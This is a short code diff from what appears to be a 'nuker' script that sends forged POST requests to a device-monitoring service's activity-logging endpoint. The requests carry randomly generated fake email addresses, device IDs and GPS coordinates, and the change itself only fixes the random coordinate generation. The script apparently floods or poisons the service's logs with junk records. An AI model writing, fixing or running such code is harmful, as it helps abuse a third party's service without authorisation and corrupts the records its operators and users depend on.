@@ -18,7 +18,7 @@ if(nuker){
 		var xhttpReq = new XMLHttpRequest,
 			url='https://devices.lsmdm.com/log/activity', //  base url to connect to
 			email=genName()+'@gmail.edu', // lol fake gmail edu
-			geo=[getRandomInt(0.000000001),getRandomInt(9.999999999)],
+			geo=[getRandomInt(0.000000001,9.999999999),getRandomInt(0.000000001,9.999999999)],
 			body = 'info[platform]=chromeTracker&info[email]='+email+'&info[udid]='+email+'&info[gps]='+JSON.stringify(geo)+'&info[phrases]=1'; // post request body
 
 		xhttpReq.open('POST',url,!0);
